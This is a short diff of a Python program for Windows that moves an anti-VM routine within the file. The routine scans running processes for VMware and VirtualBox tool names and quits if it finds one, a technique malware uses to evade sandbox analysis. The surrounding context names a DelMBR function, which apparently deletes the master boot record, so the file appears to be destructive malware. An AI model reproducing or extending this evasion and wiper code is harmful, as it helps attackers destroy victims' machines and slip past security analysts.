@@ -36,6 +36,17 @@ DontDownloadPath = str(Path.home()) + "\\AppData\\Local\\Temp\\djj012ndawm10d9wa
 #System Paths
 TempPath = str(Path.home()) + "\\AppData\\Local\\Temp"
 
+def AntiVm():
+  #Searches for processes with the name, and when he has found a process, the program quits
+  Process = ["vmsrvc.exe" , "vmusrvc.exe", "vboxtray.exe", "vmtoolsd.exe", "df5serv.exe", "vboxservice.exe"]
+  for process in psutil.process_iter():
+      for i in Process:
+        if i in process.name().lower():
+            return CommitSuicide()
+
+def CommitSuicide():
+  sys.exit()
+
 def Installation():
     #Look for the file, and when its found, the program quits
     if not os.path.isfile(DontDownloadPath):
@@ -81,17 +92,6 @@ def DelMBR():
 
     sleep(randint(5, 10))
     Window()
-
-def AntiVm():
-  #Searches for processes with the name, and when he has found a process, the program quits
-  Process = ["vmsrvc.exe" , "vmusrvc.exe", "vboxtray.exe", "vmtoolsd.exe", "df5serv.exe", "vboxservice.exe"]
-  for process in psutil.process_iter():
-      for i in Process:
-        if i in process.name().lower():
-            return CommitSuicide()
-
-def CommitSuicide():
-  sys.exit()
 
 def DTM():
     try:
